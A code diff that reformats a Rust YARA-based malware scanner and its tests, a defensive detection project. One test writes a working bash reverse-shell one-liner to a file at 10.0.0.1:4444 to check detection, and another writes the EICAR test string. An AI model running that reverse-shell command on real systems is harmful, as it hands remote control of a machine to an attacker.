@@ -30,8 +30,8 @@ impl YaraScanner {
     /// Compile the embedded YARA rule set and return a ready scanner.
     pub fn new() -> Result<Self> {
         let source = yara_rules_source::all_rules();
-        let compiled_rules = yara_x::compile(source.as_str())
-            .context("Failed to compile embedded YARA rules")?;
+        let compiled_rules =
+            yara_x::compile(source.as_str()).context("Failed to compile embedded YARA rules")?;
         info!("YARA scanner initialized with embedded rules");
         Ok(Self { compiled_rules })
     }
@@ -47,7 +47,8 @@ impl YaraScanner {
         };
 
         let mut scanner = yara_x::Scanner::new(&self.compiled_rules);
-        let scan_results = scanner.scan(&data)
+        let scan_results = scanner
+            .scan(&data)
             .context(format!("YARA scan failed for {}", path.display()))?;
 
         let mut findings = Vec::new();
@@ -98,7 +99,11 @@ impl YaraScanner {
             // Skip very large files (> 50 MB) to avoid memory issues
             if let Ok(meta) = path.metadata() {
                 if meta.len() > 50 * 1024 * 1024 {
-                    debug!("Skipping large file ({}MB): {}", meta.len() / 1024 / 1024, path.display());
+                    debug!(
+                        "Skipping large file ({}MB): {}",
+                        meta.len() / 1024 / 1024,
+                        path.display()
+                    );
                     continue;
                 }
             }
@@ -106,11 +111,7 @@ impl YaraScanner {
             match self.scan_file(path) {
                 Ok(findings) => {
                     if !findings.is_empty() {
-                        warn!(
-                            "YARA: {} match(es) in {}",
-                            findings.len(),
-                            path.display()
-                        );
+                        warn!("YARA: {} match(es) in {}", findings.len(), path.display());
                     }
                     all_findings.extend(findings);
                 }
@@ -248,11 +249,8 @@ impl ScanModule for SignatureDetectionModule {
                 Ok(yara_findings) => {
                     for yf in yara_findings {
                         finding_counter += 1;
-                        let fid = format!(
-                            "{}-{:03}",
-                            yf.severity.finding_id_prefix(),
-                            finding_counter
-                        );
+                        let fid =
+                            format!("{}-{:03}", yf.severity.finding_id_prefix(), finding_counter);
 
                         all_findings.push(Finding {
                             id: fid,
@@ -278,10 +276,7 @@ impl ScanModule for SignatureDetectionModule {
                                 }
                             ),
                             reproduction: Some(Reproduction {
-                                method: format!(
-                                    "yara-scan {}",
-                                    yf.file_path.display()
-                                ),
+                                method: format!("yara-scan {}", yf.file_path.display()),
                                 tool: None,
                                 arguments: None,
                             }),
@@ -290,9 +285,7 @@ impl ScanModule for SignatureDetectionModule {
                                 audit_record: None,
                                 canary_detected: false,
                                 os_events: Vec::new(),
-                                files_modified: vec![
-                                    yf.file_path.display().to_string(),
-                                ],
+                                files_modified: vec![yf.file_path.display().to_string()],
                                 network_connections: Vec::new(),
                                 stderr_output: None,
                             },
@@ -338,10 +331,8 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let eicar_path = dir.path().join("eicar.txt");
         let mut f = std::fs::File::create(&eicar_path).unwrap();
-        f.write_all(
-            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
-        )
-        .unwrap();
+        f.write_all(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
+            .unwrap();
 
         let findings = scanner.scan_file(&eicar_path).unwrap();
         assert!(!findings.is_empty(), "EICAR test file should be detected");
@@ -396,11 +387,7 @@ mod tests {
         let scanner = YaraScanner::new().unwrap();
         let dir = tempfile::tempdir().unwrap();
         let shell_path = dir.path().join("revshell.sh");
-        std::fs::write(
-            &shell_path,
-            b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-        )
-        .unwrap();
+        std::fs::write(&shell_path, b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").unwrap();
 
         let findings = scanner.scan_file(&shell_path).unwrap();
         assert!(!findings.is_empty(), "Reverse shell should be detected");
